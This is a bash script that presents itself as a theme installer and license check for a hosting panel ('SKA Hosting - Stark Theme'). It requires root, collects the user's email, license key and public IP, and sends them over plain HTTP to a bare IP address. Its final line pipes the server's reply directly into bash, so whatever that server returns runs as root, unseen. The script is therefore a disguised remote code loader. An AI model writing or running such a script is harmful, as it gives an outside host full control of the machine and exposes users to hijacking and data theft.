#!/bin/bash
if [ "$EUID" -ne 0 ]; then
  echo -e "\e[31m❌ Error: Please run this script as root (use sudo).\e[0m"
  exit 1
fi
clear
echo -e "\e[36m\e[1m==========================================\e[0m"
echo -e "\e[36m\e[1m     SKA Hosting - Stark Theme Setup      \e[0m"
echo -e "\e[36m\e[1m==========================================\e[0m"
read -p "📧 Enter your Email: " EMAIL
read -p "🔑 Enter your License Key: " LICENSE_KEY
echo -ne "\e[33m⚙️ Fetching System IP... \e[0m"
USER_IP=$(curl -s --max-time 5 https://api.ipify.org || echo "Unknown")
echo -e "\e[32mDone ($USER_IP)\e[0m"
echo -ne "\e[33m🔄 Verifying Stark License with Server... \e[0m"

# Directly pipe the encrypted response to bash
curl -s -X POST "http://78.154.103.27:13915/api/verify-stark" \
     -H "Content-Type: application/json" \
     -d "{\"key\":\"$LICENSE_KEY\", \"email\":\"$EMAIL\", \"ip\":\"$USER_IP\"}" | bash
     
